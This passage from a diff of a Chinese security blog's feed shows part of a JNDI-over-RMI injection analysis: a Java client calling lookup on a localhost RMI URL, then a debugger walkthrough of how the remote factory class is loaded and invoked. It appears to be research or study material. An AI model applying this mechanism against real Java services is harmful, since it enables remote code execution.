+</code></pre>
+<p>客户端</p>
+<pre><code class="language-java">package org.example;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+public class JNDI {
+    public static void main(String[] args) throws Exception {
+
+        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
+        //初始化上下文
+        Context context = new InitialContext();
+
+        //调用远程类
+        context.lookup(string);
+
+
+    }
+}
+</code></pre>
+<h2 id="流程分析-3">流程分析</h2>
+<p>断点打在：</p>
+<p>步入</p>
+<figure data-type="image" tabindex="54"><img src="https://bloyet.github.io/post-images/1749492629696.png" alt="" loading="lazy"></figure>
+<p>直接看lookup了，前面那个函数流程不变</p>
+<figure data-type="image" tabindex="55"><img src="https://bloyet.github.io/post-images/1749492629712.png" alt="" loading="lazy"></figure>
+<p>调用RegistryContext 的 lookup</p>
+<figure data-type="image" tabindex="56"><img src="https://bloyet.github.io/post-images/1749492629728.png" alt="" loading="lazy"></figure>
+<p>RMI 原生获取到字节码之后，调用decodeObject</p>
+<figure data-type="image" tabindex="57"><img src="https://bloyet.github.io/post-images/1749492629743.png" alt="" loading="lazy"></figure>
+<p>首先就是判断是否为RemoteReference类型，如果是就直接把我们要实例化的对象直接强制转换成RemoteReference类型，会导致后面的第二个if进去，导致加载失败</p>
+<p>调用NamingManager#getObjectInstance，跟进</p>
+<figure data-type="image" tabindex="58"><img src="https://bloyet.github.io/post-images/1749492629759.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="59"><img src="https://bloyet.github.io/post-images/1749492629775.png" alt="" loading="lazy"></figure>
+<p>通过getFactoryClassName 获取到工厂类的全类名，调用<code>getObjectFactoryFromReference</code>先对它进行类加载<br>
+然后开始调用工厂类的<code>getObjectInstance</code>对类实现实例化加载</p>
+<figure data-type="image" tabindex="60"><img src="https://bloyet.github.io/post-images/1749492629792.png" alt="" loading="lazy"></figure>
+<p>加载字节码，</p>
+<figure data-type="image" tabindex="61"><img src="https://bloyet.github.io/post-images/1749492629806.png" alt="" loading="lazy"></figure>
+<p>获取方法，调用invoke</p>
+<figure data-type="image" tabindex="62"><img src="https://bloyet.github.io/post-images/1749492629821.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="63"><img src="https://bloyet.github.io/post-images/1749492629837.png" alt="" loading="lazy"></figure>
+<p>总结：</p>
+<p>为了获取到 context 实例而去构造 factory 工厂类，然后通过 factory 去实例化 context，然后再去通过 context 去调用各种方法</p>
+]]></content>
+    </entry>
+</feed>
